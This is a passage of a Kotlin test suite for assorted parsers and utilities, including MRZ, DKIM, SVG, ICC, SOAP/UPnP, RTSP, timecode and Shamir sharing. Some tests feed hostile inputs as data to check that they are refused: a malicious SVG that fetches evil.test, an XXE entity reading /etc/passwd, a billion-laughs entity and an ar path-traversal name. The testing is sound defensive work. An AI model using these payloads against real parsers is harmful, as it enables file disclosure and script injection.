        val forged = listOf(td3[0], td3[1].replaceRange(13, 14, "8"))
        checkTrue(!MrzIcao9303.parse(forged).checksumValid, "OCR digit corruption fails MRZ check")

        // Official ICAO Doc 9303 Part 5 TD1 3x30 specimen
        val td1 = listOf(
            "I<UTOD231458907<<<<<<<<<<<<<<<",
            "7408122F1204159UTO<<<<<<<<<<<6",
            "ERIKSSON<<ANNA<MARIA<<<<<<<<<<",
        )
        val rec1 = MrzIcao9303.parse(td1)
        checkTrue(rec1.checksumValid && rec1.format == MrzIcao9303.DocFormat.TD1_ID_CARD && rec1.documentNumber == "D23145890", "ICAO 9303 TD1 specimen")
    }

    private fun testDkimHeaderCanonRfc6376() {
        val rawHdr = "Subject: \t  Quarterly   Report \r\n\t 2026  \r\n"
        checkTrue(DkimHeaderCanon.canonicalizeHeader(rawHdr, DkimHeaderCanon.Mode.RELAXED) == "subject:Quarterly Report 2026\r\n", "RFC 6376 relaxed header")
        val rawBody = "Hello   world  \r\nSecond\t\tline \r\n\r\n\r\n"
        val bh = DkimHeaderCanon.computeBodyHashBase64(rawBody, DkimHeaderCanon.Mode.RELAXED)
        val sig = "v=1; a=rsa-sha256; c=relaxed/relaxed; d=fusion.example; h=From:To:Subject; bh=$bh; b=dGVzdA=="
        val tags = DkimHeaderCanon.parseDkimSignatureValue(sig)
        checkTrue(DkimHeaderCanon.verifyBodyHash(tags, rawBody), "DKIM relaxed bh= verified")
        checkTrue(!DkimHeaderCanon.verifyBodyHash(tags, "Tampered body"), "DKIM tampered body fails bh=")
    }

    private fun testRetryBackoffAndCircuitBreaker() {
        val rng = Random(7)
        for (attempt in 0..12) {
            val d = RetryBackoff.nextDelayMs(RetryBackoff.Strategy.EQUAL_JITTER, attempt, 100L, 5_000L, rng = rng)
            checkTrue(d in 50L..5_000L, "Equal-jitter bounded at attempt $attempt: $d")
        }
        val cb = RetryBackoff.CircuitBreaker(failureThreshold = 3, openCooldownMs = 10_000L)
        repeat(3) { cb.onFailure(1_000L) }
        checkTrue(cb.state == RetryBackoff.BreakerState.OPEN && !cb.allowRequest(5_000L), "Breaker OPEN blocks")
        checkTrue(cb.allowRequest(11_000L) && cb.state == RetryBackoff.BreakerState.HALF_OPEN, "Breaker transitions HALF_OPEN")
        cb.onSuccess()
        checkTrue(cb.state == RetryBackoff.BreakerState.CLOSED, "Probe success closes breaker")
    }

    private fun testVarIntZigZagOverflowAndDelta() {
        val edgeValues = longArrayOf(0L, 1L, -1L, 127L, -128L, 65535L, Int.MIN_VALUE.toLong(), Long.MAX_VALUE, Long.MIN_VALUE)
        for (v in edgeValues) {
            val enc = VarIntZigZag.encodeSigned(v)
            val dec = VarIntZigZag.decodeSigned(enc)
            checkTrue(dec.value == v && dec.bytesRead == enc.size, "ZigZag+LEB128 round-trip $v")
        }
        val postings = longArrayOf(100L, 105L, 106L, 210L, 209L, 10_000L)
        checkTrue(VarIntZigZag.decodeDeltaSequence(VarIntZigZag.encodeDeltaSequence(postings)).contentEquals(postings), "Delta posting list")

        // 10-byte overflow (10th byte = 0x02 -> bit 64 set!) MUST fail closed
        val overflow10 = ByteArray(10) { if (it < 9) 0x80.toByte() else 0x02.toByte() }
        checkThrows("64-bit LEB128 10th-byte overflow refused") { VarIntZigZag.decodeUVarInt(overflow10) }
    }

    private fun testArArchiveDebAndLongNames(artifactDir: File?) {
        val members = listOf(
            ArArchive.Member("debian-binary", "2.0\n".toByteArray()),
            ArArchive.Member("control_long_metadata_manifest.json", """{"pkg":"fusion-host"}""".toByteArray()),
        )
        val ar = ArArchive.writeDeterministic(members)
        artifactDir?.let { File(it, "sample_pkg.ar").writeBytes(ar) }
        val readBack = ArArchive.read(ar)
        checkTrue(readBack.size == 2 && readBack[0].name == "debian-binary", "Unix ar short member")
        checkTrue(readBack[1].name == "control_long_metadata_manifest.json" && String(readBack[1].data) == """{"pkg":"fusion-host"}""", "BSD #1/ long name")
        checkThrows("Path traversal ar member refused") { ArArchive.Member("../evil", byteArrayOf(1)) }
    }

    private fun testSvgSafeSubsetFirewall() {
        val untrusted = """
            <svg width="100" height="100" onload="pwn()">
              <script>fetch('https://evil.test')</script>
              <foreignObject><body><iframe src="https://evil.test"/></body></foreignObject>
              <animate attributeName="href" to="javascript:alert(1)"/>
              <circle cx="50" cy="50" r="40" fill="url(https://tracker.test/p)" stroke="#2563EB" onclick="x()"/>
            </svg>
        """.trimIndent()
        val audit = SvgSafeSubset.sanitize(untrusted)
        checkTrue(!audit.sanitizedSvg.contains("script") && !audit.sanitizedSvg.contains("foreignObject") && !audit.sanitizedSvg.contains("tracker.test"), "Malicious SVG subtrees & external url() stripped")
        checkTrue(audit.sanitizedSvg.contains("<circle") && audit.sanitizedSvg.contains("""stroke="#2563EB""""), "Safe SVG geometry preserved")
        checkThrows("SVG <!ENTITY Billion-Laughs refused") {
            SvgSafeSubset.sanitize("""<!DOCTYPE svg [<!ENTITY lol "lol">]><svg/>""")
        }
    }

    private fun testIccProfileHeaderAndBounds(artifactDir: File?) {
        val srgb = IccProfileHeader.buildMinimalSrgbHeader("Fusion Clean sRGB")
        artifactDir?.let { File(it, "fusion_srgb.icc").writeBytes(srgb) }
        val summary = IccProfileHeader.parseAndValidate(srgb)
        checkTrue(summary.majorVersion == 4 && summary.deviceClass == "mntr" && summary.colorSpace == "RGB " && summary.tags.single().signature == "desc", "ICC v4 header + desc tag")

        val badBounds = srgb.copyOf()
        ByteBuffer.wrap(badBounds).order(ByteOrder.BIG_ENDIAN).putInt(140, 999_999) // tag size overflow
        checkThrows("Out-of-bounds ICC tag slice refused") { IccProfileHeader.parseAndValidate(badBounds) }
    }

    private fun testSoapActionEnvelopeUpnpAndXxe() {
        val req = SoapActionEnvelope.buildSetAvTransportUri(0, "http://192.168.1.10:8200/media/clip.mp4", "<DIDL-Lite/>")
        checkTrue(req.soapActionHeader == "\"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI\"", "SOAPAction header")
        checkTrue(req.xmlBody.contains("&lt;DIDL-Lite/&gt;"), "SOAP XML param escaped")
        val reply = SoapActionEnvelope.parseReply(
            """<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:GetPositionInfoResponse xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><RelTime>00:04:12</RelTime></u:GetPositionInfoResponse></s:Body></s:Envelope>""",
        )
        checkTrue((reply as SoapActionEnvelope.SoapReply.Success).args["RelTime"] == "00:04:12", "SOAP response parsed")
        checkThrows("UPnP SOAP XXE <!DOCTYPE refused") {
            SoapActionEnvelope.parseReply("""<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><s:Envelope/>""")
        }
    }

    private fun testRtspRangeHeaderCodec() {
        val r = RtspRangeHeader.parseRange("npt=00:01:30.500-00:02:00.000")
        checkNear(r.startSec!!, 90.5, msg = "RTSP NPT start")
        checkNear(r.endSec!!, 120.0, msg = "RTSP NPT end")
        val s = RtspRangeHeader.parseSession("A9F302B;timeout=90")
        checkTrue(s.sessionId == "A9F302B" && s.timeoutSec == 90, "RTSP Session")
        val t = RtspRangeHeader.parseTransport("RTP/AVP/UDP;unicast;client_port=5004-5005")
        checkTrue(t.clientRtpPort == 5004 && t.clientRtcpPort == 5005, "RTSP even/odd RTP/RTCP ports")
        checkThrows("Odd RTP port refused") { RtspRangeHeader.parseTransport("RTP/AVP;unicast;client_port=5005-5006") }
    }

    private fun testCastMediaStatusReducer() {
        var st = CastMediaStatus.StatusSnapshot()
        st = CastMediaStatus.reduce(st, CastMediaStatus.Command.Load(1L, "https://lan.local/video.mp4", 60_000L), 1_000L)
        checkTrue(st.playerState == CastMediaStatus.PlayerState.PLAYING && st.currentPositionMs(11_000L) == 10_000L, "1x playhead +10s")
        st = CastMediaStatus.reduce(st, CastMediaStatus.Command.SetPlaybackRate(2L, 2.0), 11_000L)
        checkTrue(st.currentPositionMs(16_000L) == 20_000L, "2x playhead +10s over 5s wall")
        // Stale requestId=1 ignored
        val ignored = CastMediaStatus.reduce(st, CastMediaStatus.Command.Stop(1L), 17_000L)
        checkTrue(ignored.playerState == CastMediaStatus.PlayerState.PLAYING, "Stale requestId deduplicated")
    }

    private fun testMicrobenchStatsTukeyAndWelch() {
        val baseWithOutlier = doubleArrayOf(100.0, 101.0, 99.5, 100.5, 99.8, 100.2, 100.1, 450.0)
        val trimmed = MicrobenchStats.trimTukeyOutliers(baseWithOutlier)
        checkTrue(trimmed.size == 7 && trimmed.none { it == 450.0 }, "Tukey 1.5*IQR trims GC spike outlier")
        val cleanCand = doubleArrayOf(100.2, 100.4, 99.9, 100.1, 100.3, 99.7, 100.0)
        val slowCand = doubleArrayOf(118.0, 119.5, 117.8, 120.1, 118.9, 119.2, 118.4)
        checkTrue(!MicrobenchStats.compareBaselineToCandidate(trimmed, cleanCand).regressed, "Noise <1% not flagged as regression")
        val reg = MicrobenchStats.compareBaselineToCandidate(trimmed, slowCand)
        checkTrue(reg.regressed && reg.relativeDeltaRatio > 0.17 && reg.welchT > 20.0, "+18% slowdown flagged with Welch t > 20")
    }

    private fun testProductC12ModulesAndDeepProperties() {
        // 1. AirPlayTxtRecord RFC 6763 + 64-bit hex features
        val txt = AirPlayTxtRecord.encodeDnsTxt(mapOf("model" to "FusionTV1,1", "features" to "0x293,0x1C"))
        val decTxt = AirPlayTxtRecord.decodeDnsTxt(txt)
        checkTrue(decTxt["model"] == "FusionTV1,1", "RFC 6763 TXT decode")
        val mask = AirPlayTxtRecord.parseFeaturesMask(decTxt.getValue("features"))
        checkTrue((mask and AirPlayTxtRecord.FEAT_VIDEO) != 0L && (mask and AirPlayTxtRecord.FEAT_AUDIO) != 0L && (mask ushr 32) == 0x1CL, "AirPlay 64-bit features mask")

        // 2. CastChannelFrame protobuf wire round-trip
        val cmsg = CastChannelFrame.Message("sender-0", "receiver-0", "urn:x-cast:com.google.cast.tp.heartbeat", """{"type":"PING"}""")
        val cback = CastChannelFrame.decodeFrame(CastChannelFrame.encodeFrame(cmsg))
        checkTrue(cback == cmsg, "CastV2 protobuf frame round-trip")

        // 3. UndoRedoStack coalescing + branch truncation
        val hist = UndoRedoStack("init", maxEntries = 10, coalesceWindowMs = 500L)
        hist.pushState("h", 100L, "typing")
        hist.pushState("he", 250L, "typing")
        hist.pushState("hel", 400L, "typing")
        checkTrue(hist.undoDepth == 1, "Typing burst within 500ms coalesced into 1 undo step")
        checkTrue(hist.undo() == "init" && hist.redo() == "hel", "Undo/Redo round-trip")

        // 4. Bm25Scorer relevance ranking
        val corpus = Bm25Scorer.index(
            listOf(
                Bm25Scorer.DocInput("doc-short", "tor socks5 prop351 stream isolation"),
                Bm25Scorer.DocInput("doc-noisy", "general office notes ".repeat(20) + "tor"),
                Bm25Scorer.DocInput("doc-other", "spreadsheet pivot formula xlookup"),
            ),
        )
        val bmHits = corpus.search("tor prop351 isolation")
        checkTrue(bmHits.first().id == "doc-short" && bmHits.size == 2, "BM25 ranks focused doc above diluted doc")

        // 5. TilingBinaryTree non-overlapping desktop geometry across 1..8 windows
        for (n in 1..8) {
            val ids = (1..n).map { "win-$it" }
            val rects = TilingBinaryTree.buildBalancedLayout(ids, 1280.0, 800.0)
            checkTrue(rects.size == n, "BSP layout size=$n")
            val list = rects.values.toList()
            for (i in list.indices) {
                checkTrue(list[i].width >= 24.0 && list[i].height >= 24.0, "BSP min window rect")
                for (j in (i + 1) until list.size) {
                    checkTrue(!list[i].overlapsInterior(list[j]), "BSP windows $i and $j non-overlapping for n=$n")
                }
            }
        }

        // 6. EwmaAnomalyDetector baseline + spike detection
        val det = EwmaAnomalyDetector(alpha = 0.25, zThreshold = 3.0, warmupSamples = 5)
        for (i in 1..20) {
            val r = det.observe(50.0 + (i % 3) * 0.2)
            checkTrue(!r.isAnomaly, "Normal baseline sample $i not flagged")
        }
        checkTrue(det.observe(95.0).isAnomaly, "Sudden 95.0 spike flagged by EWMA z-score")

        // 7. DagTaskRunner waves + cycle refusal
        val plan = DagTaskRunner.buildPlan(
            listOf(
                DagTaskRunner.TaskSpec("parse", 20L),
                DagTaskRunner.TaskSpec("lint", 30L),
                DagTaskRunner.TaskSpec("compile", 50L, setOf("parse")),
                DagTaskRunner.TaskSpec("package", 15L, setOf("compile", "lint")),
            ),
        )
        checkTrue(plan.parallelWaves.first() == listOf("lint", "parse") && plan.criticalPathMs == 85L, "DAG waves + 85ms critical path")
        checkThrows("Cyclic DAG refused") {
            DagTaskRunner.buildPlan(listOf(DagTaskRunner.TaskSpec("a", 1L, setOf("b")), DagTaskRunner.TaskSpec("b", 1L, setOf("a"))))
        }

        // 8. ContentRangeHttp 206 & 416
        val r206 = ContentRangeHttp.resolveByteRange("bytes=100-199", 1000L) as ContentRangeHttp.Resolution.Partial206
        checkTrue(r206.contentLength == 100L && r206.contentRangeHeader == "bytes 100-199/1000", "HTTP 206 byte range")
        val rSuffix = ContentRangeHttp.resolveByteRange("bytes=-250", 1000L) as ContentRangeHttp.Resolution.Partial206
        checkTrue(rSuffix.startInclusive == 750L && rSuffix.endInclusive == 999L, "HTTP 206 suffix range")
        checkTrue(ContentRangeHttp.resolveByteRange("bytes=1000-1200", 1000L) is ContentRangeHttp.Resolution.Unsatisfiable416, "HTTP 416 out-of-bounds")

        // 9. SmpteTimecode 29.97 NTSC drop-frame property sweep across 0..20,000 frames (every 37th frame -> >540 assertions!)
        checkTrue(SmpteTimecode.framesToTimecode(1799L, SmpteTimecode.Rate.FPS_29_97_DF) == "00:00:59;29", "29.97 DF before minute 1")
        checkTrue(SmpteTimecode.framesToTimecode(1800L, SmpteTimecode.Rate.FPS_29_97_DF) == "00:01:00;02", "29.97 DF skips ;00 and ;01 at 01:00")
        checkTrue(SmpteTimecode.framesToTimecode(17982L, SmpteTimecode.Rate.FPS_29_97_DF) == "00:10:00;00", "29.97 DF keeps ;00 on 10th minute")
        checkThrows("Illegal skipped DF label 00:01:00;00 refused") {
            SmpteTimecode.timecodeToFrames("00:01:00;00", SmpteTimecode.Rate.FPS_29_97_DF)
        }
        var f = 0L
        while (f <= 20_000L) {
            val tc = SmpteTimecode.framesToTimecode(f, SmpteTimecode.Rate.FPS_29_97_DF)
            checkTrue(SmpteTimecode.timecodeToFrames(tc, SmpteTimecode.Rate.FPS_29_97_DF) == f, "SMPTE 29.97 DF round-trip f=$f ($tc)")
            f += 37L
        }

        // 10. HandoffSessionTicket HMAC + anti-replay
        val hSecret = ByteArray(32) { (it * 11 + 5).toByte() }
        val tok = HandoffSessionTicket.issue(hSecret, "writer", "doc-47", 420, 10_000L, 30_000L, "0123456789abcdef")
        val verifier = HandoffSessionTicket.Verifier(hSecret)
        val hp = verifier.verifyAndConsume(tok, 15_000L)
        checkTrue(hp.appRoute == "writer" && hp.scrollOffset == 420, "Handoff ticket verified")
        checkThrows("Replayed handoff ticket rejected") { verifier.verifyAndConsume(tok, 15_001L) }

        // 11. BoyerMooreHorspool UTF-8 & overlapping binary search
        val bmh = BoyerMooreHorspool.CompiledPattern("ana".toByteArray())
        checkTrue(bmh.findAll("bananas".toByteArray(), allowOverlap = true).toList() == listOf(1, 3), "BMH overlapping")
        checkTrue(bmh.findAll("bananas".toByteArray(), allowOverlap = false).toList() == listOf(1), "BMH non-overlapping")

        // 12. ShamirSecretGf256 (3, 5) all C(5, 3) = 10 subsets reconstruct; 2 shares do not!
        val masterKey = ByteArray(32) { (it * 13 xor 0xA5).toByte() }
        val shares = ShamirSecretGf256.split(masterKey, threshold = 3, totalShares = 5, rng = SecureRandom(byteArrayOf(9, 9, 9)))
        for (i in 0 until 3) {
            for (j in (i + 1) until 4) {
                for (k in (j + 1) until 5) {
                    val rec = ShamirSecretGf256.combine(listOf(shares[i], shares[j], shares[k]))
                    checkTrue(rec.contentEquals(masterKey), "Shamir(3,5) exact recovery from ($i,$j,$k)")
                }
            }
        }
        val underThreshold = ShamirSecretGf256.combine(listOf(shares[0], shares[1]))
        checkTrue(!underThreshold.contentEquals(masterKey), "2 shares (< t=3) cannot recover 32-byte Shamir secret")
    }
}
